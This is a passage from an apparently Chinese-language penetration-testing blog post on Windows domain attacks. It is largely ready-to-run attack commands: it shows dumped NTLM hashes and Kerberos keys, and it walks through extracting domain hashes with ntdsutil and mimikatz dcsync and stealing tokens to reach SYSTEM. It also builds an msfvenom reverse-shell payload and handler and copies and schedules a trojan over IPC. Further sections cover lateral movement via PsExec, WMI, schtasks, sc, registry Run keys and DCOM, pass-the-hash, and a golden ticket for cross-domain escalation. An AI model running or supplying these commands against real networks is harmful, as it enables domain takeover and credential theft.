class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">5791</span>ed4fcb24d37bb6d45e422d0564b6</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDasc0t6e</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : fca1c2a6324d2824dfb41aa111c7225eb054028a1943c4a2f88b33e5c1d6d724</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">707804346421</span>c4c8834250d85b3a0d80</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">89763</span>b4ae3b3f829</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDasc0t6e</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">89763</span>b4ae3b3f829</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>eb (<span class="number">1003</span>)</span><br><span class="line">User : www2</span><br><span class="line">  Hash NTLM: <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : acc5ca5339811d2f4cf44f8427ff9333</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDwww2</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">37425</span>bb81e1ceb50cff95dfb985c60aeb3a44941b1c186cf6a2ecb66cb87a49d</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : b6ae15c330aa7db1b0f4b53575516c1e</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">622</span>f8686a8fecbc8</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDwww2</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">622</span>f8686a8fecbc8</span><br></pre></td></tr></table></figure><h3 id="域Hash"><a href="#域Hash" class="headerlink" title="域Hash"></a>域Hash</h3><h4 id="NTDSUTIL"><a href="#NTDSUTIL" class="headerlink" title="NTDSUTIL"></a>NTDSUTIL</h4><p>该NTDSUTIL是一个命令行工具，它是域控制器生态系统的一部分，其目的是为了使管理员能够访问和管理<code>Windows Active Directory</code>数据库。但是，渗透测试人员和redteam可以用它来拍摄现有ntds.dit文件的快照，该文件可以复制到新位置以进行离线分析和密码哈希的提取。</p><blockquote><p>PS：只有在域服务器上才有这个程序</p></blockquote><p>执行这个命令就可以拍摄快照了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full C:\ntdsutil</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/59.png" alt="image-20200803213243474"></p><p>然后在<code>C:\ntdsutil</code>位置就能看到拍摄的快照了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/60.png" alt="image-20200803213325057"></p><p>然后可以使用<strong>NTDSDumpEx</strong>进行解密，项目地址如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;NTDSDumpEx</span><br></pre></td></tr></table></figure><p>如果你只是使用管理员权限运行的话可以执行如下命令来获取hash，<code>-d</code>表示该文件的路径，<code>-k</code>表示获取的SYSTEM的key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsdumpex.exe -r</span><br><span class="line">ntdsdumpex.exe -d ntds.dit -o hash.txt -k HEX-SYS-KEY</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/61.png" alt="image-20200803214714406"></p><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>Mimikatz有一个功能（dcsync），它利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值。这样子解决了需要直接使用域控制器进行身份验证的需要，因为它可以从域管理员的上下文中获得执行权限。因此它是红队的基本操作，因为它不那么复杂。</p><p>提取域中所有用户HASH</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/62.png" alt="image-20200803215925120"></p><p>如果要获取指定的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;user:admin</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/63.png" alt="image-20200803220106374"></p><h4 id="AccessToken窃取"><a href="#AccessToken窃取" class="headerlink" title="AccessToken窃取"></a>AccessToken窃取</h4><blockquote><p>令牌(Token)</p></blockquote><p><strong>令牌(token)是系统的临时秘钥，相当于账号和密码</strong>，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，<strong>访问网络和系统资源</strong>，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。</p><p><strong>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</strong></p><p><strong>令牌有很多种：</strong></p><ul><li>访问令牌(Access Token)：表示访问控制操作主体的系统对象</li><li>会话令牌(Session Token)：是交互会话中唯一的身份标识符</li><li>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾</li></ul><p><strong>Windows的AccessToken有两种类型：</strong></p><ul><li><strong>Delegation Token：授权令牌，它支持交互式会话登录</strong> (例如本地用户直接登录、远程桌面登录访问)</li><li><strong>Impresonation Token：模拟令牌，它是非交互的会话</strong> (例如使用net use访问共享文件夹)。</li></ul><p><strong>注：</strong> 两种token只在系统重启后清除 具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效。</p><p>目前有三种利用方式incognito.exe程序 、InvokeTokenManipulat.ps1脚本 、MSF里的incognito模块</p><h5 id="程序incognito"><a href="#程序incognito" class="headerlink" title="程序incognito"></a>程序incognito</h5><p>下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.mwrinfosecurity.com&#x2F;assets&#x2F;BlogFiles&#x2F;incognito2.zip</span><br></pre></td></tr></table></figure><p><strong>AccessToken的列举</strong>(需要administrator权限)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/64.png" alt="image-20200803221305645"></p><p>可以看到Token都列举出来了，我们只需要复制token然后即可提权，也可以进行降权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#提权至system</span></span><br><span class="line">.\incognito.exe execute -c <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/65.png" alt="image-20200803221740843"></p><h5 id="MSF下的incognito模块"><a href="#MSF下的incognito模块" class="headerlink" title="MSF下的incognito模块"></a>MSF下的incognito模块</h5><p>首先生成进程让我们的kali连接到域控中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.183.138  LPORT=6666 -e x86/shikata_ga_nai -i 5 -b <span class="string">&quot;\x00&quot;</span> -f exe &gt;test.exe</span><br></pre></td></tr></table></figure><p>然后监听进程连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.183.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>连接上后就可以直接提权了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use incognito <span class="comment">#加载incognito</span></span><br><span class="line">list_tokens -u <span class="comment">#列出AccessToken</span></span><br><span class="line">getuid    <span class="comment">#查看当前token</span></span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="comment">#模拟system用户，getsystem命令即实现了该命令。如果要模拟其他用户，将token名改为其他用户即可</span></span><br><span class="line">steal_token 1252 <span class="comment">#从进程窃取token</span></span><br><span class="line">getsystem <span class="comment">#提升至system权限</span></span><br><span class="line">rev2self <span class="comment">#返回到之前的AccessToken权限</span></span><br></pre></td></tr></table></figure><h5 id="Invoke-TokenManipulation-ps1脚本"><a href="#Invoke-TokenManipulation-ps1脚本" class="headerlink" title="Invoke-TokenManipulation.ps1脚本"></a>Invoke-TokenManipulation.ps1脚本</h5><p>下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;blob&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-TokenManipulation.ps1</span><br></pre></td></tr></table></figure><p>使用命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入脚本</span></span><br><span class="line">Import-Module .\Invoke-TokenManipulation.ps1</span><br><span class="line"><span class="comment">#列举token</span></span><br><span class="line">Invoke-TokenManipulation -Enumerate</span><br><span class="line"><span class="comment">#提权至system</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -Username <span class="string">&quot;nt authoritysystem&quot;</span></span><br><span class="line"><span class="comment">#复制(窃取)进程token</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -ProcessId 500</span><br><span class="line"><span class="comment">#复制(窃取)线程token</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -ThreadId 500</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/66.png" alt="image-20200803225323734"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/67.png" alt="image-20200803225536976"></p><h5 id="利用token获得TrustedInstaller权限"><a href="#利用token获得TrustedInstaller权限" class="headerlink" title="利用token获得TrustedInstaller权限"></a>利用token获得TrustedInstaller权限</h5><p>在Windows系统中，即使获得了管理员权限和system权限，也不能修改系统文件</p><p>因为Windows系统的最高权限为<strong>TrustedInstaller</strong></p><p>可以看到我们拥有<strong>SYSTEM</strong>权限也无法在目录<code>C:\Windows\servicing</code>下写入文件</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/68.png" alt="image-20200803225848113"></p><p>但是<strong>TrustedInstaller.exe</strong>是有这个权限的，可以通过<code>Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner</code>来查看</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/69.png" alt="image-20200803231351000"></p><p>我们可以使用<code>sc.exe start TrustedInstaller</code>来启动这个服务，然后找到这个进程，通过窃取这个进程的Token来提升权限</p><p>可以看到下图虽然我们还是system的权限，但是我们已经可以在<code>C:\Windows\servicing</code>目录下面写入文件了，同理MSF中的incognito模块也能成功</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/70.png" alt="image-20200803231243500"></p><h3 id="密码喷射"><a href="#密码喷射" class="headerlink" title="密码喷射"></a>密码喷射</h3><p>弱口令，永远改不完。在内网中，也可以尝试对smb、3389、mssql弱口令进行密码暴力破解，但是要注意线程，密码数不要太多。当然，也可以使用不同账号，同个密码进行尝试。这里使用kerbrute对域用户/密码进行暴力破解</p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ropnop&#x2F;kerbrute</span><br></pre></td></tr></table></figure><p>这项目需要使用字典来枚举用户或者枚举密码，这里就懒得演示了</p><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>留个坑，这个还不是很明白</p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>全程使用windows 10 连接我们的域控 windows 2008 </p><ul><li>域控IP： <strong>192.168.183.143</strong></li><li>用户名：<strong>administrator</strong></li><li>密码：<strong>XXXXXX</strong></li></ul><h3 id="账号密码链接"><a href="#账号密码链接" class="headerlink" title="账号密码链接"></a>账号密码链接</h3><p>当我们获取到机器的账号密码的时候，可以尝试用以下几种方式进行连接并执行命令。</p><h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><p>利用条件：</p><ul><li><strong>139</strong> or <strong>445</strong>端口开启</li><li>管理员开启默认共享</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\1.1.1.1\ipc$  &quot;password&quot; &#x2F;user:username</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/71.png" alt="image-20200805211744299"></p><p>建立好连接后可以把对方的C盘映射到自己的Z盘中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use z: \\192.168.183.143\c$</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/72.png" alt="image-20200805211845297"></p><p>还能执行木马文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#建立好IPC后，把shell.exe复制到目标机器上(这里的$是指admin用户的c:\winnt\system32\)</span><br><span class="line">copy shell.exe \\1.1.1.1\admin$</span><br><span class="line">#然后查看目标机器的时间</span><br><span class="line">net time \\127.0.0.1</span><br><span class="line">#用at命令让目标机器12点执行shell.exe文件</span><br><span class="line">at \1.1.1.1 12:00 shell.exe</span><br></pre></td></tr></table></figure><h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><p>直接去微软官网下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;sysinternals&#x2F;downloads&#x2F;psexec</span><br></pre></td></tr></table></figure><p>下载好把文件提取出来就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 用服务启动的方式：</span><br><span class="line">.\PsExec.exe  \\1.1.1.1 -accepteula -u username -p  password cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/73.png" alt="image-20200805212914831"></p><h4 id="WMI-amp-WINRM"><a href="#WMI-amp-WINRM" class="headerlink" title="WMI&amp;WINRM"></a>WMI&amp;WINRM</h4><p><strong>方法一</strong></p><p>创建记事本进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic  /user:<span class="string">&quot;ascotbe.com\administrator&quot;</span>  /password:<span class="string">&quot;password&quot;</span>  /node:1.1.1.1 process call create <span class="string">&quot;notepad&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/74.png" alt="image-20200805213359196"></p><p>然后看域控中的进程</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/75.png" alt="image-20200805213420618"></p><p><strong>方法二</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WmiMethod  -class win32_process -name create -argumentlist <span class="string">&#x27;notepad&#x27;</span> -ComputerName  1.1.1.1 -Credential <span class="string">&#x27;ascotbe.com\administrator&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>方法三</strong></p><p>直接用360灵腾实验室的工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/360-Linton-Lab/WMIHACKER</span><br></pre></td></tr></table></figure><p>有回显查看whoami</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/76.png" alt="image-20200805220346919"></p><p>还有文件下载、上传、模拟shell等模式</p><h4 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h4><p>定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 1.1.1.1 /u domain\Administrator /p password /ru <span class="string">&quot;SYSTEM&quot;</span>  /tn <span class="string">&quot;windowsupdate&quot;</span> /sc DAILY  /tr <span class="string">&quot;calc&quot;</span> /F</span><br><span class="line">schtasks /run /s 1.1.1.1 /u domain\Administrator /p password /tn windowsupdate</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/77.png" alt="image-20200805220733211"></p><p>然后查看我们域控，可以发现后台启动了计算器并且是SYSTEM权限</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/78.png" alt="image-20200805220811976"></p><h4 id="AT"><a href="#AT" class="headerlink" title="AT"></a>AT</h4><p>这个就是计划任务上面IPC的时候讲了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at  \\1.1.1.1 15:15 calc</span><br></pre></td></tr></table></figure><h4 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h4><p>这个和上面的计划任务类似，启动计算器进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc  \\1.1.1.1 create windowsupdate binpath= <span class="string">&quot;calc&quot;</span></span><br><span class="line">sc  \\1.1.1.1 start windowsupdate</span><br></pre></td></tr></table></figure><h4 id="REG"><a href="#REG" class="headerlink" title="REG"></a>REG</h4><p>利用注册列表来添加计算器进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add  \\1.1.1.1\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t  REG_SZ /d <span class="string">&quot;calc&quot;</span></span><br></pre></td></tr></table></figure><h4 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法一</span></span><br><span class="line"><span class="variable">$com</span>  = [activator]::CreateInstance([<span class="built_in">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;1.1.1.1&quot;</span>))</span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span><br><span class="line"><span class="comment">#  方法二</span></span><br><span class="line"><span class="variable">$com</span>  = [Type]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;1.1.1.1&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span>  = [System.Activator]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$item</span>  = <span class="variable">$obj</span>.item()</span><br><span class="line"><span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)</span><br><span class="line"><span class="comment">#  方法三</span></span><br><span class="line"><span class="variable">$com</span>  = [Type]::GetTypeFromCLSID(<span class="string">&#x27;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#x27;</span>,<span class="string">&quot;1.1.1.1&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span>  = [System.Activator]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$obj</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)</span><br></pre></td></tr></table></figure><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>当我们没有明文账号密码，只有hash时，可以尝试hash传递。</p><h4 id="impacket套件"><a href="#impacket套件" class="headerlink" title="impacket套件"></a>impacket套件</h4><p>项目下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket</span><br></pre></td></tr></table></figure><p>执行个whoami命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc domain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/79.png" alt="image-20200805223113417"></p><p>其他方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用上面讲过的psexec</span></span><br><span class="line">psexec.exe  -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc     domiain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="comment">#利用smbexec</span></span><br><span class="line">smbexec.exe  -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc   domiain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><h4 id="Invoke-TheHash套件"><a href="#Invoke-TheHash套件" class="headerlink" title="Invoke-TheHash套件"></a>Invoke-TheHash套件</h4><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Kevin-Robertson&#x2F;Invoke-TheHash&#x2F;</span><br></pre></td></tr></table></figure><p>两种方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec  -Target 1.1.1.1 -Domain test.local -Username username -Hash  7ECFFFF0C3548187607A14BAD0F88BB1 -Command <span class="string">&quot;calc.exe&quot;</span> -verbose</span><br><span class="line">Invoke-SMBExec  -Target 1.1.1.1 -Domain test.local -Username username -Hash  7ECFFFF0C3548187607A14BAD0F88BB1 -Command <span class="string">&quot;calc.exe&quot;</span> -verbose</span><br></pre></td></tr></table></figure><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>命令如下，这边要提一点需要在本机有管理员权限，还需要和目标相同的架构，这边使用的是X64版本的mimikatz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth  /user:administrator /domain:ascotbe.com /ntlm:208976c3facce54a3b6b003fcae5d6dc</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/80.png" alt="image-20200805224842818"></p><p>安装KB2871997补丁后，可以使用AES-256密钥进行hash传递：</p><p>抓取AES-256密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth   /user:administrator /domain:ascotbe.com /aes256:aes256key</span><br></pre></td></tr></table></figure><h3 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM-Relay"></a>NTLM-Relay</h3><p>这个感觉有点鸡肋，通过钓鱼来实现的，先占坑后面要是有需求在研究</p><h3 id="域信任-1"><a href="#域信任-1" class="headerlink" title="域信任"></a>域信任</h3><p>当存在子父域时，默认其是双向信任。可以利用sid history跨域提权。流程大致如下：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/104.png" alt="img"></p><p>利用如下，使用mimikatz获取子域的Krbtgt Hash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::lsa  /patch</span><br></pre></td></tr></table></figure><p>再使用powerview获取父域的sid：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer  -Domain ascotbe.com</span><br></pre></td></tr></table></figure><p>然后添加一个sid=519的企业管理员，利用mimikatz执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden  /user:Administrator /krbtgt:5a1c26831592774a17f70370b8606449 /domain:child.ascotbe.com  /sid:S-1-5-21-1786649982-4053697927-1628754434  /sids:S-1-5-21-4288736272-2299089681-4131927610-519 /ptt</span><br></pre></td></tr></table></figure><h3 id="攻击Kerberos"><a href="#攻击Kerberos" class="headerlink" title="攻击Kerberos"></a>攻击Kerberos</h3><p>麻省理工学院研发Kerberos协议来保护雅典娜工程（Project Athena）提供的网络服务器。这个协议以希腊神话中的人物Kerberos（或者Cerberus）命名，他在希腊神话中是Hades的一条凶猛的三头保卫神犬。<strong>在Windows域环境中,KDC的角色常常由DC(Domain Controller)来担任</strong>,Kerberos是一种<strong>基于票据的认证方式</strong>,票据(Ticket)是用来安全的在认证服务器和用户请求的服务之间传递用户的身份,同时也会传递一些附加信息,用来保证使用Ticket的用户必须是Ticket中指定的用户,<strong>Ticket一旦生成,在生存时间内可以被Client多次使用来申请同一个Server的服务(票据窃取问题)</strong></p><blockquote><p> 这里面涉及到的一些名词缩写</p></blockquote><ul><li>KDC(Key Distribution Center):密钥分发中心，里面包含两个服务：AS和TGS</li><li>AS(Authentication Server):身份认证服务</li><li>TGS(Ticket Granting Server):票据授予服务,<strong>该服务提供的票据也称为 TGS 或者叫白银票据</strong></li><li>TGT(Ticket Granting 